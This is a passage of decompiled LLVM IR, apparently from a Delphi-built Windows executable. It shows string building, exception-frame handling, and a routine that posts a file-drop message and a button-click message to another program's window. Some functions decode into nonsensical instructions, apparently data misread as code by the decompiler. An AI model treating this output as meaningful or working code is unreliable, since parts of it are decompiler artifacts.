  %17 = add i32 %esp.0.reload, -20, !insn.addr !1121
  %18 = inttoptr i32 %17 to i32*, !insn.addr !1121
  %19 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1121
  store i32 %19, i32* %18, align 4, !insn.addr !1121
  %20 = add i32 %esp.0.reload, -24, !insn.addr !1122
  %21 = inttoptr i32 %20 to i32*, !insn.addr !1122
  store i32 4218781, i32* %21, align 4, !insn.addr !1122
  %22 = call i32 @__readfsdword(i32 0), !insn.addr !1123
  %23 = add i32 %esp.0.reload, -28, !insn.addr !1123
  %24 = inttoptr i32 %23 to i32*
  store i32 %22, i32* %24, align 4, !insn.addr !1123
  call void @__writefsdword(i32 0, i32 %23), !insn.addr !1124
  %25 = call i32 @function_405bbc(), !insn.addr !1125
  %26 = icmp eq i32 %25, 0, !insn.addr !1126
  store i32* %24, i32** %.pre-phi.reg2mem, !insn.addr !1127
  store i32 %23, i32* %esp.1.reg2mem, !insn.addr !1127
  br i1 %26, label %dec_label_pc_405f68, label %dec_label_pc_405da6, !insn.addr !1127

dec_label_pc_405da6:                              ; preds = %dec_label_pc_405d38
  %27 = add i32 %esp.0.reload, -32, !insn.addr !1128
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1128
  store i32 ptrtoint ([6 x i8]* @global_var_405fb8 to i32), i32* %28, align 4, !insn.addr !1128
  %29 = add i32 %esp.0.reload, -36, !insn.addr !1129
  %30 = inttoptr i32 %29 to i32*, !insn.addr !1129
  %31 = add i32 %esp.0.reload, -40, !insn.addr !1130
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1130
  store i32 ptrtoint ([3 x i8]* @global_var_405fc8 to i32), i32* %32, align 4, !insn.addr !1130
  %33 = call i32 @"@LStrCatN"(), !insn.addr !1131
  %34 = call i32 @function_405c7c(), !insn.addr !1132
  %35 = call i32 @function_405cfc(), !insn.addr !1133
  %36 = call i32 @function_405c7c(), !insn.addr !1134
  %37 = call i32 @function_405cfc(), !insn.addr !1135
  %38 = call i32 @"@LStrCat"(), !insn.addr !1136
  %39 = call i32 @function_405c7c(), !insn.addr !1137
  %40 = call i32 @function_405cfc(), !insn.addr !1138
  %41 = call i32 @"@LStrCat"(), !insn.addr !1139
  %42 = call i32 @function_405c7c(), !insn.addr !1140
  %43 = call i32 @function_405cfc(), !insn.addr !1141
  %44 = add i32 %esp.0.reload, -44, !insn.addr !1142
  %45 = inttoptr i32 %44 to i32*, !insn.addr !1142
  store i32 ptrtoint ([13 x i8]* @global_var_405fec to i32), i32* %45, align 4, !insn.addr !1142
  %46 = add i32 %esp.0.reload, -48, !insn.addr !1143
  %47 = inttoptr i32 %46 to i32*, !insn.addr !1143
  store i32 %arg1, i32* %47, align 4, !insn.addr !1143
  %48 = add i32 %esp.0.reload, -52, !insn.addr !1144
  %49 = inttoptr i32 %48 to i32*, !insn.addr !1144
  store i32 ptrtoint (i32* @global_var_406004 to i32), i32* %49, align 4, !insn.addr !1144
  %50 = add i32 %esp.0.reload, -56, !insn.addr !1145
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1145
  store i32 ptrtoint ([3 x i8]* @global_var_405fc8 to i32), i32* %51, align 4, !insn.addr !1145
  %52 = call i32 @"@LStrCatN"(), !insn.addr !1146
  %53 = call i32 @function_405c7c(), !insn.addr !1147
  %54 = call i32 @function_405cfc(), !insn.addr !1148
  %55 = add i32 %esp.0.reload, -60, !insn.addr !1149
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1149
  store i32 ptrtoint ([11 x i8]* @global_var_406010 to i32), i32* %56, align 4, !insn.addr !1149
  %57 = add i32 %esp.0.reload, -64, !insn.addr !1150
  %58 = inttoptr i32 %57 to i32*, !insn.addr !1150
  store i32 %arg2, i32* %58, align 4, !insn.addr !1150
  %59 = add i32 %esp.0.reload, -68, !insn.addr !1151
  %60 = inttoptr i32 %59 to i32*, !insn.addr !1151
  store i32 ptrtoint (i32* @global_var_406004 to i32), i32* %60, align 4, !insn.addr !1151
  %61 = add i32 %esp.0.reload, -72, !insn.addr !1152
  %62 = inttoptr i32 %61 to i32*, !insn.addr !1152
  store i32 ptrtoint ([3 x i8]* @global_var_405fc8 to i32), i32* %62, align 4, !insn.addr !1152
  %63 = call i32 @"@LStrCatN"(), !insn.addr !1153
  %64 = call i32 @function_405c7c(), !insn.addr !1154
  %65 = call i32 @function_405cfc(), !insn.addr !1155
  %66 = call i32 @function_405c7c(), !insn.addr !1156
  %67 = call i32 @function_405cfc(), !insn.addr !1157
  %68 = add i32 %esp.0.reload, -76, !insn.addr !1158
  %69 = inttoptr i32 %68 to i32*, !insn.addr !1158
  store i32 ptrtoint ([8 x i8]* @global_var_406034 to i32), i32* %69, align 4, !insn.addr !1158
  %70 = add i32 %esp.0.reload, -80, !insn.addr !1159
  %71 = inttoptr i32 %70 to i32*, !insn.addr !1159
  store i32 %arg1, i32* %71, align 4, !insn.addr !1159
  %72 = add i32 %esp.0.reload, -84, !insn.addr !1160
  %73 = inttoptr i32 %72 to i32*, !insn.addr !1160
  store i32 ptrtoint (i32* @global_var_406004 to i32), i32* %73, align 4, !insn.addr !1160
  %74 = add i32 %esp.0.reload, -88, !insn.addr !1161
  %75 = inttoptr i32 %74 to i32*, !insn.addr !1161
  store i32 ptrtoint ([3 x i8]* @global_var_405fc8 to i32), i32* %75, align 4, !insn.addr !1161
  %76 = add i32 %esp.0.reload, -92, !insn.addr !1162
  %77 = inttoptr i32 %76 to i32*, !insn.addr !1162
  store i32 ptrtoint ([6 x i8]* @global_var_406044 to i32), i32* %77, align 4, !insn.addr !1162
  %78 = add i32 %esp.0.reload, -96, !insn.addr !1163
  %79 = inttoptr i32 %78 to i32*, !insn.addr !1163
  store i32 %arg2, i32* %79, align 4, !insn.addr !1163
  %80 = add i32 %esp.0.reload, -100, !insn.addr !1164
  %81 = inttoptr i32 %80 to i32*, !insn.addr !1164
  store i32 ptrtoint (i32* @global_var_406004 to i32), i32* %81, align 4, !insn.addr !1164
  %82 = add i32 %esp.0.reload, -104, !insn.addr !1165
  %83 = inttoptr i32 %82 to i32*, !insn.addr !1165
  store i32 ptrtoint ([3 x i8]* @global_var_405fc8 to i32), i32* %83, align 4, !insn.addr !1165
  %84 = add i32 %esp.0.reload, -108, !insn.addr !1166
  %85 = inttoptr i32 %84 to i32*, !insn.addr !1166
  store i32 ptrtoint ([10 x i8]* @global_var_406054 to i32), i32* %85, align 4, !insn.addr !1166
  %86 = add i32 %esp.0.reload, -112, !insn.addr !1167
  %87 = inttoptr i32 %86 to i32*, !insn.addr !1167
  store i32 %arg3, i32* %87, align 4, !insn.addr !1167
  %88 = add i32 %esp.0.reload, -116, !insn.addr !1168
  %89 = inttoptr i32 %88 to i32*, !insn.addr !1168
  store i32 ptrtoint ([3 x i8]* @global_var_405fc8 to i32), i32* %89, align 4, !insn.addr !1168
  %90 = add i32 %esp.0.reload, -120, !insn.addr !1169
  %91 = inttoptr i32 %90 to i32*, !insn.addr !1169
  store i32 ptrtoint ([3 x i8]* @global_var_405fc8 to i32), i32* %91, align 4, !insn.addr !1169
  %92 = add i32 %esp.0.reload, -124, !insn.addr !1170
  %93 = inttoptr i32 %92 to i32*, !insn.addr !1170
  store i32 %arg4, i32* %93, align 4, !insn.addr !1170
  %94 = add i32 %esp.0.reload, -128, !insn.addr !1171
  %95 = inttoptr i32 %94 to i32*, !insn.addr !1171
  store i32 ptrtoint ([3 x i8]* @global_var_405fc8 to i32), i32* %95, align 4, !insn.addr !1171
  %96 = add i32 %esp.0.reload, -132, !insn.addr !1172
  %97 = inttoptr i32 %96 to i32*, !insn.addr !1172
  store i32 ptrtoint (i32* @global_var_406068 to i32), i32* %97, align 4, !insn.addr !1172
  %98 = add i32 %esp.0.reload, -136, !insn.addr !1173
  %99 = inttoptr i32 %98 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_405fc8 to i32), i32* %99, align 4, !insn.addr !1173
  %100 = call i32 @"@LStrCatN"(), !insn.addr !1174
  %101 = call i32 @function_405c7c(), !insn.addr !1175
  %102 = call i32 @function_405cfc(), !insn.addr !1176
  %103 = call i32 @function_405c7c(), !insn.addr !1177
  %104 = call i32 @function_405cfc(), !insn.addr !1178
  %105 = call i32 @function_405c70(), !insn.addr !1179
  store i32* %99, i32** %.pre-phi.reg2mem, !insn.addr !1180
  store i32 %98, i32* %esp.1.reg2mem, !insn.addr !1180
  br label %dec_label_pc_405f68, !insn.addr !1180

dec_label_pc_405f68:                              ; preds = %dec_label_pc_405da6, %dec_label_pc_405d38
  %106 = add i32 %esp.0.reload, -16, !insn.addr !1181
  %107 = inttoptr i32 %106 to i32*, !insn.addr !1181
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %108 = load i32, i32* %.pre-phi.reload, align 4, !insn.addr !1182
  call void @__writefsdword(i32 0, i32 %108), !insn.addr !1183
  %109 = add i32 %esp.1.reload, 8, !insn.addr !1184
  %110 = inttoptr i32 %109 to i32*, !insn.addr !1184
  store i32 4218788, i32* %110, align 4, !insn.addr !1184
  %111 = call i32 @"@LStrArrayClr"(), !insn.addr !1185
  %112 = call i32 @"@LStrArrayClr"(), !insn.addr !1186
  %113 = call i32 @"@LStrArrayClr"(), !insn.addr !1187
  ret i32 %113, !insn.addr !1188
}

define i32 @function_405f9d() local_unnamed_addr {
dec_label_pc_405f9d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1189
  ret i32 %0, !insn.addr !1189
}

define i32 @function_405fa2() local_unnamed_addr {
dec_label_pc_405fa2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1190
}

define i32 @function_405fa4(i32 %arg1) local_unnamed_addr {
dec_label_pc_405fa4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1191
}

define i32 @function_40606f() local_unnamed_addr {
dec_label_pc_40606f:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %3 = add i32 %0, 1, !insn.addr !1192
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1192
  store i32 %3, i32* %4, align 4, !insn.addr !1192
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1193
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1193
  %9 = add i8 %6, %8, !insn.addr !1193
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1193
  store i8 %9, i8* %10, align 1, !insn.addr !1193
  %11 = add i32 %2, 85, !insn.addr !1194
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1194
  %13 = load i8, i8* %12, align 1, !insn.addr !1194
  %14 = trunc i32 %1 to i8, !insn.addr !1194
  %15 = add i8 %13, %14, !insn.addr !1194
  store i8 %15, i8* %12, align 1, !insn.addr !1194
  %16 = call i32 @__readfsdword(i32 0), !insn.addr !1195
  store i32 %16, i32* %stack_var_-16, align 4, !insn.addr !1195
  %17 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1195
  call void @__writefsdword(i32 0, i32 %17), !insn.addr !1196
  %18 = load i32, i32* @global_var_4096c0, align 4, !insn.addr !1197
  %19 = add i32 %18, 1, !insn.addr !1197
  %20 = icmp eq i32 %19, 0, !insn.addr !1197
  store i32 %19, i32* @global_var_4096c0, align 4, !insn.addr !1197
  %21 = icmp eq i1 %20, false, !insn.addr !1198
  br i1 %21, label %dec_label_pc_4060a9, label %dec_label_pc_406095, !insn.addr !1198

dec_label_pc_406095:                              ; preds = %dec_label_pc_40606f
  %22 = call i32 @"@LStrClr"(), !insn.addr !1199
  %23 = call i32 @"@LStrClr"(), !insn.addr !1200
  br label %dec_label_pc_4060a9, !insn.addr !1200

dec_label_pc_4060a9:                              ; preds = %dec_label_pc_406095, %dec_label_pc_40606f
  %24 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1201
  call void @__writefsdword(i32 0, i32 %24), !insn.addr !1202
  ret i32 0, !insn.addr !1203
}

define i32 @function_4060b7() local_unnamed_addr {
dec_label_pc_4060b7:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1204
  ret i32 %0, !insn.addr !1204
}

define i32 @function_4060bc() local_unnamed_addr {
dec_label_pc_4060bc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1205
}

define i32 @function_4060be(i32 %arg1) local_unnamed_addr {
dec_label_pc_4060be:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1206
}

define i32 @function_4060c0() local_unnamed_addr {
dec_label_pc_4060c0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096c0, align 4, !insn.addr !1207
  %2 = add i32 %1, -1, !insn.addr !1207
  store i32 %2, i32* @global_var_4096c0, align 4, !insn.addr !1207
  ret i32 %0, !insn.addr !1208
}

define i32 @function_4060c8() local_unnamed_addr {
dec_label_pc_4060c8:
  %esp.0.reg2mem = alloca i32, !insn.addr !1209
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-64 = alloca i8*, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-28 = alloca i8*, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !1210
  %2 = icmp eq i32 %0, 0, !insn.addr !1211
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1212
  br i1 %2, label %dec_label_pc_4061d2, label %dec_label_pc_4060e2, !insn.addr !1212

dec_label_pc_4060e2:                              ; preds = %dec_label_pc_4060c8
  %3 = call i32 @function_4036f4(), !insn.addr !1213
  %4 = inttoptr i32 %3 to i8*, !insn.addr !1214
  store i8* %4, i8** %stack_var_-28, align 4, !insn.addr !1214
  %5 = ptrtoint i8** %stack_var_-28 to i32, !insn.addr !1214
  %6 = call i1 @PathFileExistsA(i8* %4), !insn.addr !1215
  %7 = icmp eq i1 %6, false, !insn.addr !1216
  store i32 %5, i32* %esp.0.reg2mem, !insn.addr !1217
  br i1 %7, label %dec_label_pc_4061d2, label %dec_label_pc_4060fd, !insn.addr !1217

dec_label_pc_4060fd:                              ; preds = %dec_label_pc_4060e2
  %8 = load i8*, i8** %stack_var_-28, align 4
  %9 = call i32* @FindWindowExA(i32* null, i32* bitcast ([7 x i8]* @global_var_4061e0 to i32*), i8* null, i8* %8), !insn.addr !1218
  %10 = ptrtoint i32* %9 to i32, !insn.addr !1218
  store i32 %10, i32* %stack_var_-48, align 4, !insn.addr !1219
  %11 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !1219
  %12 = call i1 @IsWindow(i32* %9), !insn.addr !1220
  %13 = icmp eq i1 %12, false, !insn.addr !1221
  store i32 %11, i32* %esp.0.reg2mem, !insn.addr !1222
  br i1 %13, label %dec_label_pc_4061d2, label %dec_label_pc_406126, !insn.addr !1222

dec_label_pc_406126:                              ; preds = %dec_label_pc_4060fd
  %14 = call i32 @function_4034f4(), !insn.addr !1223
  %15 = add i32 %14, 22, !insn.addr !1224
  store i32 66, i32* %stack_var_-56, align 4, !insn.addr !1225
  %16 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1225
  %17 = call i32* @GlobalAlloc(i32 %15, i32 66), !insn.addr !1226
  %18 = icmp eq i32* %17, null, !insn.addr !1227
  store i32 %16, i32* %esp.0.reg2mem, !insn.addr !1228
  br i1 %18, label %dec_label_pc_4061d2, label %dec_label_pc_406145, !insn.addr !1228

dec_label_pc_406145:                              ; preds = %dec_label_pc_406126
  %19 = call i32* @GlobalLock(i32* nonnull %17), !insn.addr !1229
  %20 = icmp eq i32* %19, null, !insn.addr !1230
  %21 = icmp eq i1 %20, false, !insn.addr !1231
  br i1 %21, label %dec_label_pc_406159, label %dec_label_pc_406151, !insn.addr !1231

dec_label_pc_406151:                              ; preds = %dec_label_pc_406145
  %22 = bitcast i32* %17 to i8*, !insn.addr !1232
  store i8* %22, i8** %stack_var_-64, align 4, !insn.addr !1232
  %23 = ptrtoint i8** %stack_var_-64 to i32, !insn.addr !1232
  %24 = call i32* @GlobalFree(i32* nonnull %17), !insn.addr !1233
  store i32 %23, i32* %esp.0.reg2mem, !insn.addr !1234
  br label %dec_label_pc_4061d2, !insn.addr !1234

dec_label_pc_406159:                              ; preds = %dec_label_pc_406145
  %25 = ptrtoint i32* %17 to i32, !insn.addr !1226
  %26 = ptrtoint i32* %19 to i32, !insn.addr !1229
  store i32 20, i32* %19, align 4, !insn.addr !1235
  %27 = add i32 %26, 4, !insn.addr !1236
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1236
  store i32 0, i32* %28, align 4, !insn.addr !1236
  %29 = add i32 %26, 8, !insn.addr !1237
  %30 = inttoptr i32 %29 to i32*, !insn.addr !1237
  store i32 0, i32* %30, align 4, !insn.addr !1237
  %31 = add i32 %26, 12, !insn.addr !1238
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1238
  store i32 0, i32* %32, align 4, !insn.addr !1238
  %33 = add i32 %26, 16, !insn.addr !1239
  %34 = inttoptr i32 %33 to i32*, !insn.addr !1239
  store i32 0, i32* %34, align 4, !insn.addr !1239
  %35 = call i32 @function_4036f4(), !insn.addr !1240
  %36 = inttoptr i32 %35 to i8*, !insn.addr !1241
  store i8* %36, i8** %stack_var_-64, align 4, !insn.addr !1241
  %37 = add i32 %26, 20, !insn.addr !1242
  %38 = inttoptr i32 %37 to i8*, !insn.addr !1243
  %39 = call i8* @lstrcpyA(i8* %36, i8* %38), !insn.addr !1244
  %40 = call i1 @GlobalUnlock(i32* nonnull %17), !insn.addr !1245
  %41 = call i1 @PostMessageA(i32* null, i32 %25, i32 563, i32 %10), !insn.addr !1246
  %42 = call i32 @function_407484(i32 4219368, i32 2000, i32 -1), !insn.addr !1247
  store i32 %42, i32* %stack_var_-104, align 4, !insn.addr !1248
  %43 = ptrtoint i32* %stack_var_-104 to i32, !insn.addr !1248
  %44 = inttoptr i32 %42 to i32*, !insn.addr !1249
  %45 = call i1 @IsWindow(i32* %44), !insn.addr !1249
  %46 = icmp eq i1 %45, false, !insn.addr !1250
  store i32 %43, i32* %esp.0.reg2mem, !insn.addr !1251
  br i1 %46, label %dec_label_pc_4061d2, label %dec_label_pc_4061c3, !insn.addr !1251

dec_label_pc_4061c3:                              ; preds = %dec_label_pc_406159
  store i32 %42, i32* %stack_var_-120, align 4, !insn.addr !1252
  %47 = ptrtoint i32* %stack_var_-120 to i32, !insn.addr !1252
  %48 = call i32 @SendMessageA(i32* null, i32 0, i32 245, i32 %42), !insn.addr !1253
  store i32 %47, i32* %esp.0.reg2mem, !insn.addr !1253
  br label %dec_label_pc_4061d2, !insn.addr !1253

dec_label_pc_4061d2:                              ; preds = %dec_label_pc_4061c3, %dec_label_pc_406159, %dec_label_pc_406151, %dec_label_pc_406126, %dec_label_pc_4060fd, %dec_label_pc_4060e2, %dec_label_pc_4060c8
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %49 = add i32 %esp.0.reload, 4, !insn.addr !1254
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1254
  %51 = load i32, i32* %50, align 4, !insn.addr !1254
  ret i32 %51, !insn.addr !1255
}

define i32 @function_4061dd(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_4061dd:
  %ebp.0.reg2mem = alloca i32, !insn.addr !1256
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %ebx = alloca i32, align 4
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %5 = trunc i32 %4 to i8
  %6 = mul i8 %5, 2, !insn.addr !1256
  %7 = inttoptr i32 %4 to i8*, !insn.addr !1256
  store i8 %6, i8* %7, align 1, !insn.addr !1256
  %8 = bitcast i32* %ebx to i8*
  %9 = load i8, i8* %8, align 4, !insn.addr !1257
  %10 = udiv i32 %4, 256, !insn.addr !1257
  %11 = trunc i32 %10 to i8, !insn.addr !1257
  %12 = add i8 %9, %11, !insn.addr !1257
  %13 = load i32, i32* %ebx, align 4, !insn.addr !1257
  %14 = inttoptr i32 %13 to i8*, !insn.addr !1257
  store i8 %12, i8* %14, align 1, !insn.addr !1257
  %15 = and i32 %4, 14
  %16 = icmp ugt i32 %15, 9, !insn.addr !1258
  %17 = add i32 %4, 6, !insn.addr !1258
  %18 = select i1 %16, i32 %17, i32 %4, !insn.addr !1258
  %19 = zext i1 %16 to i32, !insn.addr !1258
  %20 = and i32 %4, -65536, !insn.addr !1258
  %21 = and i32 %18, 14
  %22 = icmp ugt i32 %21, 9, !insn.addr !1259
  %23 = or i1 %16, %22, !insn.addr !1259
  %24 = add i32 %18, 6, !insn.addr !1259
  %25 = select i1 %23, i32 %24, i32 %18, !insn.addr !1259
  %26 = zext i1 %23 to i32, !insn.addr !1259
  %27 = and i32 %25, 15, !insn.addr !1259
  %28 = or i32 %27, %20, !insn.addr !1259
  %reass.add = add nuw nsw i32 %26, %19
  %reass.mul = mul i32 %reass.add, 256
  %29 = add i32 %reass.mul, %4
  %30 = and i32 %29, 65280, !insn.addr !1259
  %31 = or i32 %28, %30, !insn.addr !1259
  %32 = inttoptr i32 %31 to i8*, !insn.addr !1260
  %33 = load i8, i8* %32, align 1, !insn.addr !1260
  %34 = trunc i32 %27 to i8, !insn.addr !1260
  %35 = xor i8 %33, %34, !insn.addr !1260
  store i8 %35, i8* %32, align 1, !insn.addr !1260
  %36 = add i32 %0, 1311123697, !insn.addr !1261
  %37 = inttoptr i32 %36 to i8*, !insn.addr !1261
  %38 = load i8, i8* %37, align 1, !insn.addr !1261
  %39 = udiv i32 %3, 256, !insn.addr !1261
  %40 = trunc i32 %39 to i8, !insn.addr !1261
  %41 = add i8 %38, %40, !insn.addr !1261
  store i8 %41, i8* %37, align 1, !insn.addr !1261
  %42 = inttoptr i32 %31 to i32*, !insn.addr !1262
  %43 = load i32, i32* %42, align 4, !insn.addr !1262
  %44 = sub i32 %43, %31, !insn.addr !1262
  store i32 %44, i32* %42, align 4, !insn.addr !1262
  %45 = add i32 %3, 117, !insn.addr !1263
  %46 = inttoptr i32 %45 to i8*, !insn.addr !1263
  %47 = load i8, i8* %46, align 1, !insn.addr !1263
  %48 = add i8 %47, %34, !insn.addr !1263
  %49 = icmp eq i8 %48, 0, !insn.addr !1263
  store i8 %48, i8* %46, align 1, !insn.addr !1263
  br i1 %49, label %dec_label_pc_406268, label %dec_label_pc_4061f4, !insn.addr !1264

dec_label_pc_4061f4:                              ; preds = %dec_label_pc_4061dd
  %50 = xor i32 %3, %1, !insn.addr !1265
  %51 = trunc i32 %3 to i16, !insn.addr !1266
  %52 = inttoptr i32 %50 to i32*, !insn.addr !1266
  %53 = load i32, i32* %52, align 4, !insn.addr !1266
  call void @__asm_outsd(i16 %51, i32 %53), !insn.addr !1266
  %54 = inttoptr i32 %50 to i8*, !insn.addr !1267
  %55 = load i8, i8* %54, align 1, !insn.addr !1267
  call void @__asm_outsb(i16 %51, i8 %55), !insn.addr !1267
  %56 = load i8, i8* %32, align 1, !insn.addr !1268
  %57 = add i8 %56, %34, !insn.addr !1268
  store i8 %57, i8* %32, align 1, !insn.addr !1268
  %58 = call i32 @__asm_iretd(), !insn.addr !1269
  %59 = add i32 %2, -117, !insn.addr !1270
  %60 = inttoptr i32 %59 to i8*, !insn.addr !1270
  %61 = load i8, i8* %60, align 1, !insn.addr !1270
  %62 = add i8 %61, -69, !insn.addr !1270
  store i8 %62, i8* %60, align 1, !insn.addr !1270
  %63 = call i8 @__asm_in(i16 -11077), !insn.addr !1271
  %64 = call i32 @__readfsdword(i32 0), !insn.addr !1272
  store i32 %64, i32* %stack_var_-12, align 4, !insn.addr !1272
  %65 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !1272
  call void @__writefsdword(i32 0, i32 %65), !insn.addr !1273
  %66 = load i32, i32* @global_var_4096c8, align 4, !insn.addr !1274
  %67 = add i32 %66, 1, !insn.addr !1274
  store i32 %67, i32* @global_var_4096c8, align 4, !insn.addr !1274
  %68 = load i32, i32* %stack_var_-12, align 4, !insn.addr !1275
  call void @__writefsdword(i32 0, i32 %68), !insn.addr !1276
  ret i32 0, !insn.addr !1277

dec_label_pc_406268:                              ; preds = %dec_label_pc_4061dd
  %69 = call i32 @function_403cbc(), !insn.addr !1278
  store i32 %69, i32* %ebx, align 4, !insn.addr !1279
  %70 = icmp slt i32 %69, 0, !insn.addr !1280
  br i1 %70, label %dec_label_pc_406290, label %dec_label_pc_406278, !insn.addr !1281

dec_label_pc_406278:                              ; preds = %dec_label_pc_406268
  %71 = add i32 %69, 1, !insn.addr !1282
  store i32 %71, i32* %ebx, align 4, !insn.addr !1282
  %72 = call i32 @"@LStrCmp"(), !insn.addr !1283
  br label %dec_label_pc_4062d1

dec_label_pc_406290:                              ; preds = %dec_label_pc_406268
  %73 = call i32 @function_403cb4(), !insn.addr !1284
  %74 = call i32 @"@DynArraySetLength"(), !insn.addr !1285
  %75 = call i32 @function_403cbc(), !insn.addr !1286
  %76 = call i32 @"@LStrAsg"(), !insn.addr !1287
  store i32 -1, i32* %ebp.0.reg2mem, !insn.addr !1288
  br label %dec_label_pc_4062d1, !insn.addr !1288

dec_label_pc_4062d1:                              ; preds = %dec_label_pc_406278, %dec_label_pc_406290
  %ebp.0.reload = load i32, i32* %ebp.0.reg2mem
  ret i32 %ebp.0.reload, !insn.addr !1289
}

define i32 @function_4062d8() local_unnamed_addr {
dec_label_pc_4062d8:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1290
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1290
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1290
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1291
  %2 = load i32, i32* @global_var_4096cc, align 4, !insn.addr !1292
  %3 = add i32 %2, 1, !insn.addr !1292
  %4 = icmp eq i32 %3, 0, !insn.addr !1292
  store i32 %3, i32* @global_var_4096cc, align 4, !insn.addr !1292
  %5 = icmp eq i1 %4, false, !insn.addr !1293
  br i1 %5, label %dec_label_pc_406301, label %dec_label_pc_4062f1, !insn.addr !1293

dec_label_pc_4062f1:                              ; preds = %dec_label_pc_4062d8
  %6 = call i32 @"@DynArrayClear"(), !insn.addr !1294
  br label %dec_label_pc_406301, !insn.addr !1294

dec_label_pc_406301:                              ; preds = %dec_label_pc_4062f1, %dec_label_pc_4062d8
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1295
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1296
  ret i32 0, !insn.addr !1297
}

define i32 @function_40630f() local_unnamed_addr {
dec_label_pc_40630f:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1298
  ret i32 %0, !insn.addr !1298
}

define i32 @function_406314() local_unnamed_addr {
dec_label_pc_406314:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1299
}

define i32 @function_406316(i32 %arg1) local_unnamed_addr {
dec_label_pc_406316:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1300
}

define i32 @function_406318() local_unnamed_addr {
dec_label_pc_406318:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1301
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1301
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1301
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1302
  %2 = load i32, i32* @global_var_4096cc, align 4, !insn.addr !1303
  %3 = add i32 %2, -1, !insn.addr !1303
  %4 = icmp eq i32 %2, 0, !insn.addr !1303
  store i32 %3, i32* @global_var_4096cc, align 4, !insn.addr !1303
  %5 = icmp eq i1 %4, false, !insn.addr !1304
  br i1 %5, label %dec_label_pc_40634c, label %dec_label_pc_406332, !insn.addr !1304

dec_label_pc_406332:                              ; preds = %dec_label_pc_406318
  %6 = call i32 @"@DynArraySetLength"(), !insn.addr !1305
  br label %dec_label_pc_40634c, !insn.addr !1306

dec_label_pc_40634c:                              ; preds = %dec_label_pc_406332, %dec_label_pc_406318
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1307
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1308
  ret i32 0, !insn.addr !1309
}

define i32 @function_40635a() local_unnamed_addr {
dec_label_pc_40635a:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1310
  ret i32 %0, !insn.addr !1310
}

define i32 @function_40635f() local_unnamed_addr {
dec_label_pc_40635f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1311
}

define i32 @function_406361(i32 %arg1) local_unnamed_addr {
dec_label_pc_406361:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1312
}

define i32 @function_406364(i32 %arg1) local_unnamed_addr {
dec_label_pc_406364:
  %esp.0.reg2mem = alloca i32, !insn.addr !1313
  %eax = alloca i32, align 4
  %stack_var_-76 = alloca i8*, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %0 = bitcast i32* %eax to i8*
